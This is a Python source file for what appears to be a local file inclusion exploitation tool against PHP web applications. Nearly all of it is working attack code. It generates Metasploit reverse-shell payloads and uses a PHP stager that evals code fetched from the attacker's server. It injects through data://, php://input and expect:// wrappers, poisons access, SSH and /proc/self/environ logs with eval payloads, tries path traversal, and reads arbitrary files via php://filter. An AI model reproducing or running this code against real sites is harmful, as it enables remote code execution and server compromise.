__author__ = 'rotlogix'
__author__ = 'unicornFurnace'

from blessings import Terminal
from shell_generator import Generator
from msf import Payload
import sys
import time
import subprocess
import requests
import base64
import textwrap
import urlparse
from urllib import quote_plus
from os import system

#---------------------------------------------------------------------------------------------------

t = Terminal()

""" Things we will need for staged
    attacks and log poisoning """

stager_payload = "<?php eval(file_get_contents('http://{0}:8000/{1}.php'))?>"
path_traversal_sequences = ['../', '..\\', '/../', './../']

#---------------------------------------------------------------------------------------------------


def msf_payload():

        """ Arguments for Meterpreter """

        lhost = raw_input(t.green(" [*] ") + "Please Enter Host For Callbacks: ")
        lport = raw_input(t.green(" [*] ") + "Please Enter Port For Callbacks: ")

        """  Generate random shell name """

        g = Generator()
        shell = g.generate()

        print(t.green(" [*] ") + "Generating Wrapper")
        progressbar()
        print(t.red(" [!] ") + "Success!")
        print(t.green(" [*] ") + "Generating Metasploit Payload")
        progressbar()

        """ MSF payload generation """

        php = "/usr/local/share/metasploit-framework/msfpayload php/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > /tmp/{2}.php".format(lhost, lport, shell)

        try:
            msf = subprocess.Popen(php, shell=True)
            msf.wait()
        except msf.returncode as msf_error:
            if msf_error != 0:
                print(t.red(" [!] ") + "Error Generating MSF Payload ")
            else:
                print(t.red(" [!] ") + "Success! ")
                print(t.red(" [!] ") + "Payload Is Located At: /tmp/{0}.php").format(shell)

        return lhost, lport, shell

#---------------------------------------------------------------------------------------------------


def format_cookies(cookies):
    c = dict(item.split("=") for item in cookies.split(";"))
    return c

#---------------------------------------------------------------------------------------------------


def progressbar():

    bar_width = 70
    sys.stdout.write(t.green(" [*]  ") + " " * bar_width)
    sys.stdout.flush()
    sys.stdout.write("\b" * (bar_width + 1))

    for i in xrange(bar_width):
        time.sleep(0.01)
        sys.stdout.write(".")
        sys.stdout.flush()

    sys.stdout.write("\n")

#---------------------------------------------------------------------------------------------------


class Data:

    def __init__(self, target, nostager, cookies):

        self.target = target
        self.nostager = nostager
        self.cookies = cookies

    def execute_data(self):

            lhost, lport, shell = msf_payload()

            """ Build payload """
            """ Handle staging """

            if self.nostager:
                payload_file = open("/tmp/{0}.php".format(shell), "r")
                payload = payload_file.read()
                payload_file.close()
            else:
                payload = stager_payload.format(lhost, shell)

            encoded_payload = quote_plus(payload.encode('base64'))

            """ Build data wrapper """

            data_wrapper = "data://text/html;base64,{0}".format(encoded_payload)
            lfi = self.target + data_wrapper

            handle = Payload(lhost, lport, self.target, shell)
            handle.handler()

            if self.nostager:
                progressbar()
            else:
                print(t.red(" [!] ") + "Is Your Server Running?")
                print(t.yellow(" [*] ") + "To Launch Server: http-server /tmp -p 8000")
                print(t.green(" [*] ") + "Downloading Shell")
                progressbar()

            raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")

            """ LFI payload that downloads the shell with try block for actual
                attack """

            if self.cookies:
                f_cookies = format_cookies(self.cookies)
                try:
                    data_request = requests.get(lfi, cookies=f_cookies)
                    if data_request.status_code != 200:
                        print(t.red(" [!] ") + "Unexpected HTTP Response ")
                        sys.exit(1)
                except requests.exceptions.RequestException as data_error:
                    print(t.red(" [!] ") + "HTTP Error")(data_error)
            else:
                try:
                    data_request = requests.get(lfi)
                    if data_request.status_code != 200:
                        print(t.red(" [!] ") + "Unexpected HTTP Response ")
                        sys.exit(1)
                except requests.exceptions.RequestException as data_error:
                    print(t.red(" [!] ") + "HTTP Error")(data_error)

#---------------------------------------------------------------------------------------------------


class Input:

    def __init__(self, target, nostager, cookies):

        self.target = target
        self.nostager = nostager
        self.cookies = cookies

    def execute_input(self):

        lhost, lport, shell = msf_payload()

        """ Build payload """

        wrapper = "php://input"
        url = self.target + wrapper

        """ Handle staging """

        if self.nostager:
            payload_file = open("/tmp/{0}.php".format(shell), "r")
            payload = payload_file.read()
            payload_file.close()
        else:
            payload = stager_payload.format(lhost, shell)

        handle = Payload(lhost, lport, self.target, shell)
        handle.handler()

        if self.nostager:
            progressbar()
        else:
            print(t.red(" [!] ") + "Is Your Server Running?")
            print(t.yellow(" [*] ") + "To Launch Server: http-server /tmp -p 8000")
            print(t.green(" [*] ") + "Downloading Shell")
            progressbar()

        raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler Is Running ...")

        """ Handle cookies """

        if self.cookies:
            f_cookies = format_cookies(self.cookies)
            try:
                input_request = requests.post(url, data=payload, cookies=f_cookies)
                if input_request.status_code != 200:
                    print t.red(" [*] Unexpected HTTP Response ")
                    sys.exit(1)
            except requests.exceptions.RequestException as input_error:
                print t.red(" [*] HTTP Error ")(input_error)
        else:
            try:
                input_request = requests.post(url, data=payload)
                if input_request.status_code != 200:
                    print t.red(" [*] Unexpected HTTP Response ")
                    sys.exit(1)
            except requests.exceptions.RequestException as input_error:
                print t.red(" [*] HTTP Error ")(input_error)

#---------------------------------------------------------------------------------------------------


class Expect:

    def __init__(self, target, nostager, cookies):

        self.target = target
        self.nostager = nostager
        self.cookies = cookies

    def execute_expect(self):

        lhost, lport, shell = msf_payload()

        handle = Payload(lhost, lport, self.target, shell)
        handle.handler()

        """ Build payload """
        """ Handle staging """

        if self.nostager:
            payload_file = open("/tmp/{0}.php".format(shell),"r")
            payload = "expect://echo \""
            payload += quote_plus(payload_file.read().replace("\"", "\\\"").replace("$", "\\$"))
            payload += "\" | php"
            payload_file.close()
            progressbar()
        else:
            payload = "expect://echo \""+stager_payload.format(lhost, shell)+"\" | php"
            print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
            print(t.green(" [*] ") + "Downloading Shell")
            progressbar()

        lfi = self.target + payload

        raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")

        if self.cookies:
            f_cookies = format_cookies(self.cookies)
        try:
            r = requests.get(lfi, cookies=f_cookies)
            if r.status_code != 200:
                print(t.red(" [!] Unexpected HTTP Response "))
                sys.exit(1)
        except requests.exceptions.RequestException as expect_error:
            print t.red(" [!] HTTP Error ")(expect_error)
        else:
            try:
                r = requests.get(lfi, cookies=f_cookies)
                if r.status_code != 200:
                    print(t.red(" [!] Unexpected HTTP Response "))
                    sys.exit(1)
            except requests.exceptions.RequestException as expect_error:
                print t.red(" [!] HTTP Error ")(expect_error)

#---------------------------------------------------------------------------------------------------


class Logs:

    def __init__(self, target, location, nostager, relative, cookies):

        self.target = target
        self.location = location
        self.nostager = nostager
        self.relative = relative
        self.cookies = cookies

    def execute_logs(self):

        lhost, lport, shell = msf_payload()

        handle = Payload(lhost, lport, self.target, shell)
        handle.handler()

        """ Handle staging """

        if self.nostager:
            payload_file = open("/tmp/{0}.php".format(shell),"r")
            payload = "<?php eval(base64_decode('{0}')); ?>".format(payload_file.read().encode('base64').replace("\n", ""))
            payload_file.close()
            progressbar()
        else:
            payload = stager_payload.format(lhost, shell)
            print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
            print(t.green(" [*] ") + "Downloading Shell")
            progressbar()

        lfi = self.target + self.location

        raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")

        if self.cookies:
            f_cookies = format_cookies(self.cookies)
            try:
                headers = {'User-Agent': payload}
                r = requests.get(lfi, headers=headers, cookies=f_cookies)
                if r.status_code != 200:
                    print(t.red(" [!] Unexpected HTTP Response "))
                else:
                    if not self.relative:
                        r = requests.get(lfi)
                        if r.status_code != 200:
                            print(t.red(" [!] Unexpected HTTP Response "))
                    else:
                        for path_traversal_sequence in path_traversal_sequences:
                            for counter in xrange(10):
                                lfi = self.target + path_traversal_sequence*counter + self.location
                                r = requests.get(lfi)
                                if r.status_code != 200:
                                    print(t.red(" [!] Unexpected HTTP Response "))
            except requests.exceptions.RequestException as access_error:
                print t.red(" [!] HTTP Error ")(access_error)
        else:
            try:
                headers = {'User-Agent': payload}
                r = requests.get(lfi, headers=headers)
                if r.status_code != 200:
                    print(t.red(" [!] Unexpected HTTP Response "))
                else:
                    if not self.relative:
                        r = requests.get(lfi)
                        if r.status_code != 200:
                            print(t.red(" [!] Unexpected HTTP Response "))
                    else:
                        for path_traversal_sequence in path_traversal_sequences:
                            for counter in xrange(10):
                                lfi = self.target + path_traversal_sequence*counter + self.location
                                r = requests.get(lfi)
                                if r.status_code != 200:
                                    print(t.red(" [!] Unexpected HTTP Response "))
            except requests.exceptions.RequestException as access_error:
                print t.red(" [!] HTTP Error ")(access_error)

#---------------------------------------------------------------------------------------------------


class Environ:

    def __init__(self, target, nostager, relative, cookies):

        self.target = target
        self.nostager = nostager
        self.relative = relative
        self.location = "/proc/self/environ"
        self.cookies = cookies

    def execute_environ(self):

        lhost, lport, shell = msf_payload()

        handle = Payload(lhost, lport, self.target, shell)
        handle.handler()

        """ Handle staging """

        if self.nostager:
            payload_file = open("/tmp/{0}.php".format(shell),"r")
            payload = "<?php eval(base64_decode('{0}')); ?>".format(payload_file.read().encode('base64').replace("\n", ""))
            payload_file.close()
            progressbar()
        else:
            payload = stager_payload.format(lhost, shell)
            print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
            print(t.green(" [*] ") + "Downloading Shell")
            progressbar()

        """ Build LFI """

        lfi = self.target + self.location
        headers = {'User-Agent': payload}

        raw_input(t.blue(" [!] ") + "Press Enter To Continue When Your Metasploit Handler is Running ...")
        try:
            if not self.relative:
                if self.cookies:
                    f_cookies = format_cookies(self.cookies)
                    try:
                        r = requests.get(lfi, headers=headers, cookies=f_cookies)
                        if r.status_code != 200:
                            print(t.red(" [!] Unexpected HTTP Response "))
                    except requests.RequestException as access_error:
                        print t.red(" [!] HTTP Error ")(access_error)
                else:
                    try:
                        r = requests.get(lfi, headers=headers)
                        if r.status_code != 200:
                            print(t.red(" [!] Unexpected HTTP Response "))
                    except requests.RequestException as access_error:
                        print t.red(" [!] HTTP Error ")(access_error)
            else:
                for path_traversal_sequence in path_traversal_sequences:
                    for counter in xrange(10):
                        lfi = self.target + path_traversal_sequence*counter + self.location
                        if self.cookies:
                            f_cookies = format_cookies(self.cookies)
                            try:
                                r = requests.get(lfi, headers=headers, cookies=f_cookies)
                                if r.status_code != 200:
                                    print(t.red(" [!] Unexpected HTTP Response "))
                            except requests.RequestException as access_error:
                                print t.red(" [!] HTTP Error ")(access_error)
                        else:
                            try:
                                r = requests.get(lfi, headers=headers)
                                if r.status_code != 200:
                                    print(t.red(" [!] Unexpected HTTP Response "))
                            except requests.RequestException as access_error:
                                print t.red(" [!] HTTP Error ")(access_error)
        except Exception as unknown_error:
            print t.red(" [!] Unknown Error ")(unknown_error)

#---------------------------------------------------------------------------------------------------


class SSHLogs:

    def __init__(self, target, location, relative, cookies):

        self.target = target
        self.location = location
        self.relative = relative
        self.cookies = cookies

    def execute_ssh(self):

        lhost, lport, shell = msf_payload()

        handle = Payload(lhost, lport, self.target, shell)
        handle.handler()

        payload_file = open('/tmp/{0}.php'.format(shell),'r')

        payload_stage2 = quote_plus(payload_file.read())
        payload_file.close()
        payload = "<?php eval(\\$_GET['code'])?>"
        print(t.blue(" [!] ") + "Enter fake passwords to perform SSH log poisoning ...")
        host = urlparse.urlsplit(self.target).netloc
        system('/usr/bin/ssh "{0}@{1}"'.format(payload, host))

        print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
        print(t.green(" [*] ") + "Executing Shell")
        progressbar()

        """ Attempt traverse """

        if not self.relative:
            lfi = self.target + self.location + '&code={0}'.format(payload_stage2)
            if self.cookies:
                f_cookies = format_cookies(self.cookies)
                try:
                    r = requests.get(lfi, cookies=f_cookies)
                    if r.status_code != 200:
                        print(t.red(" [!] Unexpected HTTP Response "))
                except requests.exceptions.RequestException as access_error:
                    print t.red(" [!] HTTP Error ")(access_error)
            else:
                try:
                    r = requests.get(lfi)
                    if r.status_code != 200:
                        print(t.red(" [!] Unexpected HTTP Response "))
                except requests.exceptions.RequestException as access_error:
                    print t.red(" [!] HTTP Error ")(access_error)

        else:
            for path_traversal_sequence in path_traversal_sequences:
                for counter in xrange(10):
                    lfi = self.target + path_traversal_sequence*counter + self.location + '&code={0}'.format(payload_stage2)
                    if self.cookies:
                        f_cookies = format_cookies(self.cookies)
                        try:
                            r = requests.get(lfi, cookies=f_cookies)
                            if r.status_code != 200:
                                print(t.red(" [!] Unexpected HTTP Response "))
                        except requests.exceptions.RequestException as access_error:
                            print t.red(" [!] HTTP Error ")(access_error)
                    else:
                        try:
                            r = requests.get(lfi)
                            if r.status_code != 200:
                                print(t.red(" [!] Unexpected HTTP Response "))
                        except requests.exceptions.RequestException as access_error:
                            print t.red(" [!] HTTP Error ")(access_error)

#---------------------------------------------------------------------------------------------------


class Filter:

    def __init__(self, target, cookies):

        self.target = target
        self.cookies = cookies

    def execute_filter(self):

        """ Build payload """

        f_file = raw_input(t.green(" [*] ") + "Please Enter File To Read: ")
        payload = "php://filter/convert.base64-encode/resource={0}".format(f_file)
        lfi = self.target + payload

        """ Handle cookies """

        if self.cookies:
            f_cookies = format_cookies(self.cookies)
            try:
                r = requests.get(lfi, cookies=f_cookies)
                if r.status_code != 200:
                    print(t.red(" [!] Unexpected HTTP Response "))
                else:
                    progressbar()
                    try:
                        result = base64.b64decode(r.text)
                        print(t.blue(" [*] ") + "Decoded: " + t.blue(textwrap.fill(result)))
                    except TypeError as type_error:
                        print(type_error)
                        sys.exit(1)
            except requests.exceptions.RequestException as filter_error:
                print t.red(" [!] HTTP Error ")(filter_error)
        else:
            try:
                r = requests.get(lfi)
                if r.status_code != 200:
                    print(t.red(" [!] Unexpected HTTP Response "))
                else:
                    progressbar()
                    try:
                        result = base64.b64decode(r.text)
                        print(t.blue(" [*] ") + "Decoded: " + t.blue(textwrap.fill(result)))
                    except TypeError as type_error:
                        print(type_error)
                        sys.exit(1)
            except requests.exceptions.RequestException as filter_error:
                print t.red(" [!] HTTP Error ")(filter_error)